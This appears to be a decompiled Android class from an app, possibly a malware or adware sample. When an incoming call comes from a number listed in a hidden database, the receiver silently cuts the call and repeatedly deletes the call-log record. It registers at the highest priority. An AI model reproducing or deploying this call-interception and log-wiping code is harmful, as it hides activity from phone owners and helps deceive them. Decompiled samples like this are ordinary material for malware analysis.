// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.
// Jad home page: http://www.geocities.com/kpdus/jad.html
// Decompiler options: packimports(3) 

package com.admv3.listener;

import android.content.*;
import android.os.SystemClock;
import android.telephony.TelephonyManager;
import com.admv2.baseutil.BasePhoneUtil;
import com.admv2.db.DBSlient;

public class TinReceiver extends BroadcastReceiver
{

    public TinReceiver()
    {
        filter = new IntentFilter();
    }

    public void doCatch(Context context, String s)
    {
        BasePhoneUtil.ceth(context);
        int i = 0;
        do
        {
            if(i >= 3)
                return;
            BasePhoneUtil.deleteCall(context, s);
            SystemClock.sleep(1000L);
            i++;
        } while(true);
    }

    public void onReceive(Context context, Intent intent)
    {
        if(intent.getAction().equals("android.intent.action.PHONE_STATE") && intent.getStringExtra("state").equals(TelephonyManager.EXTRA_STATE_RINGING))
        {
            String s = intent.getStringExtra("incoming_number");
            if((new DBSlient(context)).slientCheck(s))
                doCatch(context, s);
        }
    }

    public void register(Context context)
    {
        filter.addAction("android.intent.action.PHONE_STATE");
        filter.setPriority(0x7fffffff);
        context.registerReceiver(this, filter);
    }

    public void unregister(Context context)
    {
        context.unregisterReceiver(this);
    }

    private IntentFilter filter;
}
